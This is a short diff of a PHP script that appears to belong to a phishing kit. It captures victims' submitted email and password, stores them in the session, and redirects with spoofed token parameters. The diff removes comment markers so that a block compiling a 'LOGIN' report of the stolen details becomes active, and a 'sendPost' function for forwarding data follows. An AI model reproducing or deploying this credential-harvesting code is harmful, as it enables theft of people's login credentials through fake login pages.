@@ -79,7 +79,7 @@ function Error()
 $_SESSION['_email_']        = $_POST['login_email'];
 $_SESSION['_password_']     = $_POST['login_password'];
 header("Location: ../home.php?customerProfileweb-id=".sha1(md5(gmdate('Dr Hard')))."_&TokenAccess=".strtoupper(sha1(256))." ");
-/*
+
 $localrez ="###################################################
 ###################################################     
 =-=-=-=-=-=-=-=-=-=- ♣ LOGIN ♣ =-=-=-=-=-=-=-=-=-
@@ -104,7 +104,6 @@ else {
 	echo ERROR();
 	}		
 
-*/
 
 //----------------send request post to url ----------------
 function sendPost($url,$data) {
